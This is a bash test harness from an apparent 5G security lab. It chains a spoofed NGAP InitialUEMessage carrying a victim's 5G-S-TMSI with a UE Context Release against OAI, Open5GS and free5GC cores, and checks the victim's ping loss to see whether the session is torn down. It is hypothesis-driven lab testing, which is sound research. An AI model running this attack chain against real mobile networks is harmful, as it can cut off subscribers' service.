#!/usr/bin/env bash
# ==========================================================================
# CHAIN:  InitialUEMessage (victim 5G-S-TMSI)  ->  UE Context Release
#   "InitialUE as a dirty binding-acquisition primitive for Release"
# ==========================================================================
#
# Contrast with verify_chain_pathswitch_then_release.sh:
#   Path Switch keeps the SAME AmfUeNgapId and rebinds Ran -> Release passes.
#   InitialUE allocates a NEW RanUe / often a NEW AmfUeNgapId, keyed by TMSI.
#
# Default NAS = builders.service_request_nas() (full plain Service Request with
# 5G-S-TMSI LV-E). Open5GS answers ServiceReject+cause on DL -> learn new AU.
# free5GC rejects plain SR (wrong sec-hdr) with no DL; use NAS_INTEGRITY=1 /
# --nas-integrity for fake-MAC probe (pcap/run_full_sr_probe.sh).
#
# Hypotheses (per core):
#   H0  standalone Release(victim AU)           -> REJECT (Open5GS/free5GC) /
#                                                 Command->requester (OAI)
#   H1  InitialUE(TMSI) then Release(victim AU) -> still REJECT if serving not stolen
#   H2  InitialUE(TMSI) then Release(learned AU)-> ACCEPT if new AU on attacker Ran
#       (Open5GS: Holding + ServiceReject DL; OAI: DL NAS with new AU)
#
# Discriminator = AMF handling of Release (Command vs reject), plus victim ping.
# Both steps MUST share one SCTP association -> tester `chain-initue-release`.
#
# USAGE:  ./verify_chain_initue_then_release.sh [oai|open5gs|free5gc]
#         bash pcap/run_full_sr_probe.sh [open5gs|free5gc]   # SR/cause-focused
# Run from ngap_tester/ with Git Bash.
set -uo pipefail
cd "$(dirname "$0")"

CORE="${1:-oai}"
case "$CORE" in
  oai)
    AMF=oai-amf; SMF=oai-smf
    GNB=ueransim-oai-ueransim-gnb-1; UE=ueransim-oai-ueransim-ue-1
    SET=1; PTR=1
    PING_TARGET=10.53.0.1   # OAI lab DN (8.8.8.8 often unreachable)
    REJECT='illegal|Unknown|does not belong|not in Ran|No existed'
    ACCEPT='UE Context Release Command|UEContextReleaseCommand|Handle UE Context Release Request'
    victim_au(){
      docker logs "$AMF" 2>&1 | grep -oE 'amf_ue_ngap_id \([0-9]+\)' \
        | grep -oE '[0-9]+' | tail -1
    }
    victim_tmsi(){
      local d
      d=$(docker logs "$AMF" 2>&1 | grep -oE 'TMSI [0-9]+' | tail -1 | grep -oE '[0-9]+')
      [ -n "$d" ] && printf '%08x' "$d"
    }
    ;;
  open5gs)
    AMF=o5gs-amf; SMF=o5gs-smf
    GNB=ueransim-open5gs-ueransim-gnb-1; UE=ueransim-open5gs-ueransim-ue-1
    SET=1; PTR=0
    PING_TARGET=8.8.8.8
    REJECT='does not belong'
    ACCEPT='UEContextReleaseCommand|sending UEContextReleaseCommand'
    victim_au(){
      docker run --rm --network net-5glab curlimages/curl -s "http://172.30.0.10:9091/ue-info" 2>/dev/null \
        | sed -n 's/.*"amf_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1
    }
    victim_tmsi(){
      local d
      d=$(docker run --rm --network net-5glab curlimages/curl -s "http://172.30.0.10:9091/ue-info" 2>/dev/null \
        | sed -n 's/.*"m_tmsi":\([0-9]*\).*/\1/p' | head -1)
      [ -n "$d" ] && printf '%08x' "$d"
    }
    ;;
  free5gc)
    AMF=f5gc-amf; SMF=f5gc-smf
    GNB=ueransim-free5gc-ueransim-gnb-1; UE=ueransim-free5gc-ueransim-ue-1
    SET=""; PTR=""
    PING_TARGET=8.8.8.8
    REJECT='is not in Ran|Unknown.*UENGAPID|not in Ran'
    ACCEPT='Send UE Context Release Command|Release Ue Context'
    victim_au(){ docker logs "$AMF" 2>&1 | grep -oE 'AU:[0-9]+' | tail -1 | grep -oE '[0-9]+'; }
    victim_tmsi(){
      local GUTI AMFID TMSI AMFID_INT
      GUTI=$(docker logs "$AMF" 2>&1 | grep -oE 'guti:[0-9a-f]+' | tail -1 | sed 's/guti://')
      [ -z "$GUTI" ] && return 1
      AMFID=${GUTI:5:6}; TMSI=${GUTI:11:8}
      AMFID_INT=$((16#$AMFID))
      # export set/pointer to caller via globals (bash functions share shell)
      SET=$(( (AMFID_INT >> 6) & 0x3FF ))
      PTR=$(( AMFID_INT & 0x3F ))
      echo "$TMSI"
    }
    ;;
  *) echo "usage: $0 [oai|open5gs|free5gc]"; exit 1;;
esac

NET=net-5glab; CFG="$CORE"; PING_IF=uesimtun0; POST=20
PING_TARGET="${PING_TARGET:-8.8.8.8}"
DIR="chain_${CORE}_initue_then_release"
ABS="$(pwd)/pcap/$DIR"; mkdir -p "$ABS"

log(){ echo -e "\033[1;35m[initue-rel:$CORE]\033[0m $*"; }
die(){ echo -e "\033[1;31m[initue-rel][ABORT]\033[0m $*"; exit 2; }
num(){ [[ "$1" =~ ^[0-9]+$ ]] && echo "$1" || echo "-1"; }
fire(){
  MSYS_NO_PATHCONV=1 docker run --rm --network "$NET" -v "$ABS:/evidence" ngap-tester \
    --config "config/$CFG.json" --evidence /evidence/attack.jsonl "$@" 2>&1 | sed 's/^/    /'; }
amf_lines(){ docker logs "$AMF" 2>&1 | wc -l | tr -d ' '; }
amf_since(){ docker logs "$AMF" 2>&1 | tail -n +$(( $1 + 1 )); }
ping_loss(){ docker exec "$UE" ping -I "$PING_IF" -c "${1:-5}" -i "${2:-1}" -W 2 "$PING_TARGET" 2>/dev/null \
             | grep -oE '[0-9]+% packet loss' | grep -oE '^[0-9]+' | tail -1; }

# 0. rebuild tester + ensure core/RAN ------------------------------------
log "rebuilding ngap-tester image (picks up chain-initue-release) ..."
docker build -t ngap-tester . || die "docker build failed"

log "ensuring $CORE + RAN up ..."
( cd ../5g-lab && ./scripts/core.sh up "$CORE" && ./scripts/ran.sh up ueransim "$CORE" ) || true
log "restarting victim UE for a fresh registration ..."
docker restart "$UE" >/dev/null || die "cannot restart UE '$UE'"
sleep 15
BASE=$(num "$(ping_loss 5 1)")
log "baseline packet loss: ${BASE}%"
{ [ "$BASE" -lt 0 ] || [ "$BASE" -ge 60 ]; } && die "victim not active (baseline ${BASE}%)."

V=$(victim_au); [ -z "${V:-}" ] && die "cannot read victim AMF-UE-NGAP-ID"
TMSI=$(victim_tmsi); [ -z "${TMSI:-}" ] && die "cannot read victim 5G-TMSI"
# free5GC: victim_tmsi runs in $(...); SET/PTR assigned inside do NOT persist.
# Re-parse GUTI in this shell so --amf-set-id/--amf-pointer are correct.
if [ "$CORE" = "free5gc" ]; then
  GUTI=$(docker logs "$AMF" 2>&1 | grep -oE 'guti:[0-9a-f]+' | tail -1 | sed 's/guti://')
  [ -z "$GUTI" ] && die "AMF set/pointer not resolved (GUTI parse failed)"
  AMFID=${GUTI:5:6}
  AMFID_INT=$((16#$AMFID))
  SET=$(( (AMFID_INT >> 6) & 0x3FF ))
  PTR=$(( AMFID_INT & 0x3F ))
  TMSI=${GUTI:11:8}
fi
[ -z "${SET}" ] && [ "$CORE" = "free5gc" ] && die "AMF set/pointer not resolved (GUTI parse failed)"
# SET may legitimately be 0 (e.g. free5GC temp GUTI cafe00); only reject unset.
[ -z "${SET+x}" ] && die "AMF set id unset"
log "victim AU=$V TMSI=$TMSI set=$SET ptr=$PTR"

# ========================================================================
# PHASE A -- CONTROL: standalone release of victim AU
# ========================================================================
log "PHASE A (control): STANDALONE ue-release AU=$V (expect reject / no victim drop) ..."
MARK=$(amf_lines)
fire ue-release --amf-ue-id "$V" --ran-ue-id 99
sleep 3
A_LOG=$(amf_since "$MARK")
A_REJECT=$(echo "$A_LOG" | grep -ciE "$REJECT" || true)
A_ACCEPT=$(echo "$A_LOG" | grep -ciE "$ACCEPT" || true)
A_PING=$(num "$(ping_loss 5 1)")
echo "$A_LOG" | grep -iE "$REJECT|$ACCEPT|Release|ErrorIndication|belong|not in Ran" \
  | tail -8 | sed 's/^/    [amfA] /'
log "PHASE A: reject~$A_REJECT accept~$A_ACCEPT victim-loss=${A_PING}%"

# ========================================================================
# PHASE B -- CHAIN: InitialUE then Release (victim + learned) one association
# ========================================================================
log "PHASE B (chain): chain-initue-release (InitialUE -> Release victim+learned) ..."
MARK=$(amf_lines)
docker exec "$UE" ping -I "$PING_IF" -c 50 -i 0.5 -W 2 "$PING_TARGET" >/tmp/initue_rel_ping.log 2>&1 &
PING_PID=$!; trap 'kill $PING_PID 2>/dev/null' EXIT
CFG_CORE="$CFG" ./capture_attack.sh "$DIR" "$AMF" "$SMF" "$GNB" "$NET" "$POST" \
    -- chain-initue-release \
       --ran-ue-id 99 \
       --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI" \
       --victim-amf-ue-id "$V" --release-target both \
       --initue-listen 4 --release-wait 6
wait $PING_PID 2>/dev/null; trap - EXIT
B_LOG=$(amf_since "$MARK")
B_REJECT=$(echo "$B_LOG" | grep -ciE "$REJECT" || true)
B_ACCEPT=$(echo "$B_LOG" | grep -ciE "$ACCEPT" || true)
B_PING=$(num "$(grep -oE '[0-9]+% packet loss' /tmp/initue_rel_ping.log | grep -oE '^[0-9]+' | tail -1)")
echo "$B_LOG" | grep -iE "InitialUE|Initial UE|5G-S-TMSI|5g_s_tmsi|Holding|New AmfUe|amf_ue_ngap|Release|belong|not in Ran|ErrorIndication|Service Reject" \
  | tail -25 | sed 's/^/    [amfB] /'
log "PHASE B: reject~$B_REJECT accept~$B_ACCEPT window-loss=${B_PING}%"

# evidence summary
if [ -f "$ABS/attack.jsonl" ]; then
  log "evidence steps:"
  grep -oE '"step": "[^"]+"|"target": "[^"]+"|"amf_ue_ngap_id": [0-9]+|"result": "[^"]+"' \
    "$ABS/attack.jsonl" | paste - - - 2>/dev/null | sed 's/^/    /' || \
    cat "$ABS/attack.jsonl" | sed 's/^/    /' | tail -20
fi

# ========================================================================
# VERDICT
# ========================================================================
log "======== VERDICT ($CORE) ========"
log "H0 standalone Release(victim AU=$V): reject~$A_REJECT accept~$A_ACCEPT ping-loss=${A_PING}%"
log "H1/H2 chain InitUE->Release:        reject~$B_REJECT accept~$B_ACCEPT window-loss=${B_PING}%"
log "See pcap/$DIR/ (amf/smf/gnb pcaps + attack.jsonl)"
log "Compare vs Path Switch chain: does InitialUE unlock Release the same way?"
echo ""
echo "Manual follow-up: inspect attack.jsonl for learned AU vs victim AU;"
echo "  Open5GS/OAI often expose a NEW AU on DL; free5GC usually does not steal serving."
